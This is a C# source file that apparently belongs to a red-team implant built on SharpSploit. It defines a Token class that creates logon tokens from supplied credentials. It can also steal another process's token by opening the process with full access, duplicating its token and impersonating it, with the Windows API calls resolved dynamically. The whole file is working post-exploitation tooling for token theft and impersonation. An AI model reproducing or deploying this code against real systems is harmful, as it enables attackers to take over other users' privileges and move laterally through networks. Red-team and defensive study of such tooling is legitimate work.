using System;
using System.Collections.Generic;
using System.Security.Principal;

using Drone.SharpSploit.Generic;

namespace StandardApi.Models
{
    public class Token : SharpSploitResult, IDisposable
    {
        public string Handle { get; private set; }
        public string Identity { get; private set; }
        public TokenSource Source { get; private set; }

        private IntPtr _handle;

        public enum TokenSource
        {
            MakeToken,
            StealToken
        }

        public bool Create(string domain, string username, string password)
        {
            var token = IntPtr.Zero;

            var success = Invocation.DynamicInvoke.Win32.Advapi32.LogonUserA(username, domain, password,
                Invocation.Data.Win32.Advapi32.LogonUserType.LOGON32_LOGON_NEW_CREDENTIALS,
                Invocation.Data.Win32.Advapi32.LogonUserProvider.LOGON32_PROVIDER_DEFAULT,
                ref token);

            if (!success) return false;
            
            _handle = token;
            Handle = $"0x{token.ToInt64()}";
            Identity = $"{domain}\\{username}";
            Source = TokenSource.MakeToken;

            return Impersonate();
        }

        public bool Impersonate()
            => Invocation.DynamicInvoke.Win32.Advapi32.ImpersonateLoggedOnUser(_handle);

        public bool Steal(uint pid)
        {
            var hProcess = Invocation.DynamicInvoke.Native.NtOpenProcess(
                pid,
                Invocation.Data.Win32.Kernel32.ProcessAccessFlags.PROCESS_ALL_ACCESS);

            var hToken = IntPtr.Zero;
            var success = Invocation.DynamicInvoke.Win32.Advapi32.OpenProcessToken(
                hProcess,
                Invocation.Data.Win32.Advapi32.TokenAccess.TOKEN_ALL_ACCESS,
                ref hToken);

            if (!success)
            {
                Invocation.DynamicInvoke.Win32.Kernel32.CloseHandle(hProcess);
                return false;
            }

            var hNewToken = IntPtr.Zero;
            success = Invocation.DynamicInvoke.Win32.Advapi32.DuplicateTokenEx(
                hToken,
                Invocation.Data.Win32.Advapi32.TokenAccess.TOKEN_ALL_ACCESS,
                Invocation.Data.Win32.WinNT.SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
                Invocation.Data.Win32.WinNT.TOKEN_TYPE.TokenImpersonation,
                ref hNewToken);

            if (!success)
            {
                Invocation.DynamicInvoke.Win32.Kernel32.CloseHandle(hToken);
                Invocation.DynamicInvoke.Win32.Kernel32.CloseHandle(hProcess);
                return false;
            }
            
            Invocation.DynamicInvoke.Win32.Kernel32.CloseHandle(hProcess);
            Invocation.DynamicInvoke.Win32.Kernel32.CloseHandle(hToken);

            _handle = hNewToken;
            Handle = $"0x{_handle.ToInt64()}";
            Identity = new WindowsIdentity(_handle).Name;
            Source = TokenSource.StealToken;

            return Impersonate();
        }

        public static bool Revert()
            => Invocation.DynamicInvoke.Win32.Advapi32.RevertToSelf();

        public void Dispose()
        {
            Revert();
            Invocation.DynamicInvoke.Win32.Kernel32.CloseHandle(_handle);
        }

        public override IList<SharpSploitResultProperty> ResultProperties =>
            new List<SharpSploitResultProperty>
            {
                new() {Name = "Handle", Value = Handle},
                new() {Name = "Identity", Value = Identity},
                new() {Name = "Source", Value = Source}
            };
    }
}